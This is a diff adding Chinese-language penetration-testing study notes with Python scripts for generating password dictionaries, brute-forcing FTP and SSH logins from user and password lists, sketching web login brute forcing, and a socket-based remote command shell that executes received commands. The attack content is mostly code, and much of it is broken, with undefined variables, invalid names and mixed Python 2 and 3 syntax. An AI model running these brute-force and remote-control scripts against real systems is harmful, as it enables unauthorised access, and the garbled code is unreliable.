@@ -1159,5 +1159,312 @@ Metasploit
 #permutations('abcd',2):从abcd中挑选两个元素，例如ab,bc,将所有结果排序，返回为新的循环器，且这些组合是有顺序的，即c和d能生成cd和dc
 #combinations('abcd',2):从abcd中挑选两个元素，例如ab,bc,将所有结果排序，返回为新的循环器，且这些组合是无序的，即c和d只能生成cd
 
+import itertools
+words = "1234567890abcdefghijklmnopqrstuvwxyz"
+temp = itertools.permutations(words,2)
+passwords = open("dic.txt","a")
+for i in temp:
+    passwords.write("".join(i))
+    passwords.write("".join("\n"))
+dic.close()
+**************************************************************
+#若已经获悉目标的密码为几个特定的字符
+import sys
+if len(sys.argv) !=3:
+    print("input : <The char of pass> <The length of pass>")
+    sys.exit(1)
+word = sys.argv[1]
+n = sys.argv[2]
+temp = itertools.permutations(words,n)
+pass = open("dic.txt","a")
+for i in temp:
+    pass.write("".join(i))
+    pass.write("".join("\n"))
+dic.close()
 ```
+
+#### FTP爆破
+
+```python
+#FTP有个匿名登录机制，用户名anonymous,密码随意
+#当然，这里的爆破是针对设置了用户名和密码的FTP
+#ftplib模块
+#ftp.connect("IP","port")，连接FTP服务和端口
+#ftp.login("user","password")，连接的用户名、密码
+#ftp.retrlines(command[,callback])，使用文本传输模式返回在服务器上执行命令的结果
+**************************************************************
+#使用指定用户名和密码登录FTP的python程序
+def Login(FTPServer,UserName,PassWord):
+    try:
+        f = ftplib.FTP(FTPServer)
+        f.connect(FTPServer,21,timeout=10)
+        f.login(UserName,PassWord)
+        #LIST是FTP本身的命令，这里用于展示FTP中的文件
+        f.retrlines('LIST')
+        f.quit()
+        print("Get the Right PassWord")
+    except ftplib.all_errors:
+        pass
+**************************************************************
+#未知用户名和密码的FTP爆破
+import ftplib
+import sys
+if len(sys.argv) != 4:
+    print("FTPBtute.py <FTPServer> <UserDic> <PasswordDic>")
+    sys.exit(1)
+FTPServer = sys.argv[1]
+UserDic = sys.argv[2]
+PasswordDic = sys.argv[3]
+def Login(FTPServer,UserName,PassWord):
+    try:
+        f = ftplib.FTP(FTPServer)
+        f.connect(FTPServer,21,timeout=10)
+        f.login(UserName,PassWord)
+        f.quit()
+        print("The UserName is %s and PassWord is %s " % (UserName,PassWord))
+    except ftplib.all_errors:
+        pass
+UserNameFile = open(UserDic,"r")
+PassWordFile = open(PasswordDic,"r")
+for user in UseNameFile.readlines():
+    for passwd in PassWordFile.readlines():
+        un = user.strip('\n')
+        pw = passwd.strip('\n')
+        Login(FTPServer, un, pw)
+```
+
+#### SSH爆破
+
+```python
+SSH即Secure Shell,建立在应用层基础上的安全协议
+目前用于远程管理的协议(Telnet协议也能远程管理，但Telnet是明文传输)
+SSH中的数据是加密的
+```
+
+```python
+#pxssh库
+#connect(host,ser,password),建立SSH连接
+#send_command(s,cmd),发送命令
+#logout(),释放连接
+#prompt(),等待提示符，通常用于等待命令执行结束
+
+import sys
+from pexpect import pxssh
+if len(sys.argv) != 4:
+    print("SSHBtute.py <SSHServer> <UserDic> <PasswordDic>")
+    sys.exit(1)
+SSHServer = sys.argv[1]
+UserDic = sys.argv[2]
+PasswordDic = sys.argv[3]
+def Login(SSHServer,UserName,PassWord):
+    try:
+        s = pxssh.pxssh()
+        s.login(SSHServer,UserName,PassWord)
+        f.quit()
+        print("The UserName is %s and PassWord is %s " % (UserName,PassWord))
+    except:
+        print '[-]Error Connecting'
+UserNameFile = open(UserDic,"r")
+PassWordFile = open(PasswordDic,"r")
+for user in UseNameFile.readlines():
+    for passwd in PassWordFile.readlines():
+        un = user.strip('\n')
+        pw = passwd.strip('\n')
+        Login(FTPServer, un, pw)
+```
+
+#### Web爆破
+
+```python
+#对Web页面的用户名和密码进行爆破
+#抓包获取在登录过程中提交的数据
+#requests   urllib
+import requests
+#get读取
+r = requests.get('http:192.168.92.2')
+#payload根据抓包的结果进行填写
+payload={"","","",""}
+#post提交
+resp=requests.post("http:",payload)
+```
+
+```python
+Burp Suite
+```
+
+# 远程控制程序&工具
+
+```python
+远程控制程序=被控端+主控端
+主控端；发送控制命令和接收执行结果
+被控端：接收并执行控制命令
+·被控端与主控端的连接方式是正向亦或是反向
+    正向：被控端执行远程控制服务端并打开端口，等待主控端的连接，此时被控端不会主动通知主控端，因此需要知道被控端的IP
+    反向：被控端会去通知主控端，无需知道被控端的IP，直接发送即可
+    故，正向控制实际不容易实现
+·按照操作系统来对远程控制工具分类，比如windows的exe，Android的apk
+```
+
+#### subprocess模块
+
+```python
+subprocess模块，执行控制命令
+**************************************************************
+若子进程不需要进行交互操作，则可使用subprocess.call
+subprocess.call(args,*,stdin=None,stdout=None,stderr=None,shell=False)
+args可以是一个字符串，也可以是一个包含程序参数的列表，用以指明需要执行的命令,args即可在python中执行对应命令
+stdin,程序的标准输入
+stdout,输出
+stderr,错误句柄
+stdin.stdout.stderr可以是PIPE，文件描述符，文件对象，默认值为None,表示从父进程继承
+shell=True则导致subprocess.call接收字符串的变量作为命令，并调用shell去执行该字符串
+shell=False则只接受数组变量作为命令，并将数组的第一个元素作为命令，其余均作为该命令的参数
+
+import subprocess
+child=subprocess.call("notepad.exe")
+print child
+**************************************************************
+subprocess.check_call()
+该函数的作用与subprocess.call几乎相同
+不同在于subprocess.check_call会对返回值进行检查。若返回值非0，则抛出CalledProcessError异常。该异常有一个returncoed属性，记录子进程的返回值，可用try except检查
+使用subprocess.check_call来对目标执行ping(两行函数效果相同)
+child=subprocess.check_call(["ping","www.baidu.com"])
+child=subprocess.check_call("ping www.baidu.com",shell=True)
+print child
+**************************************************************
+subprocess.check_output()
+会返回子进程向标准输出的输出结果，用于需要进行互动的时候
+检查退出信息，如果returncode不为0，则抛出错误subprocess.CalledProcessError
+output属性为标准输出的输出结果，可用try except检查
+child=subprocess.check_output("ping www.baidu.com",shell=True)
+print child
+**************************************************************
+subprocess.Popen
+总的来说，其实subprocess.call()、subprocess.check_call()、subprocess.check_output()都是基于Popen的封装
+# args可以是一个字符串，也可以是一个包含程序参数的列表
+# 要执行的程序一般是这个列表的第一项或者字符串本身
+class Popen(args,bufsize=0,executable=None,stdin=None,stdout=None,stderr=None,preexec_fn=None,close_fds=False,ced=None,env=None,universal_newlines=False,startupionfo=None,creationflags=0)
+
+Popen对象创建后，主程序会不自动等待子进程完成
+如果需要等待子进程，则需要使用wait()
+```
+
+```python
+#subprocess模块编写一个执行指令命令的函数
+def run_command(command):
+    # rstrip()用来删除string字符串末尾的指定字符，默认为空格
+    command=commmand.rstrip()
+    try:
+        child = subprocess.check_output(command,shell=True)
+    except:
+        child =  "can not execute the command \r\n"
+    return child
+#例如  目标执行的命令为显示C盘下的内容
+execute = "dir c:"
+output = =sun_command(execute)
+print output
+```
+
+#### 客户端向服务端发送控制命令
+
+```python
+#实现的结果：服务端可以接受来自客户端的输入
+#客户端
+import socket
+str_msg=input("输入要发送的信息：")
+s2 = socket.socket()
+s2.connect(("127.0.0.1",2345))
+s2.send(str_msg)
+print str(s2.recv(1024))
+s2.close()
+#服务端
+import subprocess
+import socket
+def run_command(command):
+    # rstrip()用来删除string字符串末尾的指定字符，默认为空格
+    command=commmand.rstrip()
+    print command
+    try:
+        child = subprocess.check_output(command,shell=True)
+        print child
+    except:
+        child =  "can not execute the command \r\n"
+    return child
+s1 = socket.socket()
+s1.bind(("127.0.0.1",2345))
+s1.listen(5)
+while 1:
+    conn,address = s1.accept()
+    print("a new connect from ",address)
+    conn.send("Hello")
+    data=conn.recv(1024)
+    print("The command is " + data)
+    output = run_command(data)
+    conn.send(output)
+conn.close()
+```
+
+```python
+#实现的结果：服务端可以接受来自客户端的输入
+# 命令行的控制方式
+#客户端
+import socket
+s2 = socket.socket()
+s2.connect(("127.0.0.1",2346))
+while 1:
+    #现在等待数据回传
+    recv_len = 1
+    response = ''
+    while revc_len:
+        data = s2.recv(4096)
+        recv_len = len(data)
+        response += data
+        if recv_len < 4096:
+            break
+    print(response, )
+    #等待更多输入
+    buffer = raw_input("")
+    buffer += '\n\n'
+    #发出去
+    s2.send(buffer)
+
+#服务端
+import subprocess
+import socket
+def run_command(command):
+    # rstrip()用来删除string字符串末尾的指定字符，默认为空格
+    command=commmand.rstrip()
+    print command
+    try:
+        child = subprocess.check_output(command,shell=True)
+        print child
+    except:
+        child =  "can not execute the command \r\n"
+    return child
+s1 = socket.socket()
+s1.bind(("127.0.0.1",2346))
+s1.listen(5)
+while 1:
+    conn,address = s1.accept()
+    print("a new connect from ",address)
+    conn.send("Hello")
+    data=conn.recv(1024)
+    print("The command is " + data)
+    while 1:
+        #跳出一个窗口
+        conn.send('<xy.#>')
+        #接收文件知道发现换行符
+        cmd_buffer = ''
+        while '\n' not in cmd+buffer:
+            cmd_buffer += conn.recv(1024)
+            #返还命令输出
+            response = run_command(cmd_buffer)
+            #返回响应数据
+            conn.send(response)
+conn.close()
+```
+
+# 无线网络渗透
+
+
 
